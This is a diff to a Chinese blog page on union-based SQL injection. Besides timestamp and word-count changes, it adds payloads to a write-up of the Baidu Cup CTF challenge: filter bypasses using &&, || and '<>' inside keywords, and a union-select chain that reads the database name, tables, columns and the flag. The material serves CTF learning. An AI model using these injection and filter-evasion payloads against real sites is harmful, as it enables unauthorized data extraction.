@@ -97,7 +97,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.loli.net/2019/10/22/jO89dQV7RFIGxKq.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/22/EpQBtF64zMTIqwf.png">
-<meta property="og:updated_time" content="2019-10-22T09:44:15.514Z">
+<meta property="og:updated_time" content="2019-10-22T10:22:01.985Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL回显注入">
 <meta name="twitter:description" content="0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &amp;apos;1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;where user_id =&amp;quot; 1 &amp;quot;or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;  注释符12345#          单行注释,常编码为%23--空格">
@@ -391,7 +391,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-10-22T17:44:15+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-22T18:22:01+08:00">
                 2019-10-22
               </time>
             
@@ -447,7 +447,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,214 字
+                  1,305 字
                 </span>
               
 
@@ -576,13 +576,22 @@
 <h2 id="0x04-百度杯sql"><a href="#0x04-百度杯sql" class="headerlink" title="0x04 百度杯sql"></a>0x04 百度杯sql</h2><p>总结：用&lt;&gt;隔开敏感字符，绕过防注入</p>
 <p>Order by 3与 union select 1，2，3都可以判断列数</p>
 <p>输入and 1=1  发现被拦截  此外 测试了or 发现也进行了拦截</p>
+<p>id=1 and 1=1</p>
+<p>id=1 or 1=1</p>
 <p>我们可以用下面的字符来替换 and 和 or</p>
-<p>and—-&gt;&amp;&amp;    ,     or—–&gt; ||      </p>
+<p>and—-&gt;&amp;&amp;    ,     or—–&gt; ||    </p>
+<p>id=1 &amp;&amp; 1=1</p>
 <p>替换后发现可以成功绕过</p>
-<p>接下来进行猜字段长度  发现order by 被拦截<br>用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der<br>,这样or又是一个被拦截的字符</p>
+<p>接下来进行猜字段长度  发现order by 被拦截</p>
+<p>id=1 order by 1</p>
+<p>用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der<br>,这样or又是一个被拦截的字符</p>
 <p>然后利用二分法，才接触长度为3</p>
+<p>id=1 o&lt;&gt;rder by 3</p>
+<p>id=1 union se&lt;&gt;lect 1,2,3</p>
 <p>在注入的时候select会被拦截，同样我们用&lt;&gt;把字符分开即可</p>
 <p>界面出现2，我们就在2的位置进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,database(),3</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos;</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,flag,3 from info</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -953,7 +962,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">全站共 21.4k 字</span>
+  <span class="post-count">全站共 21.7k 字</span>
 </div>
 
         
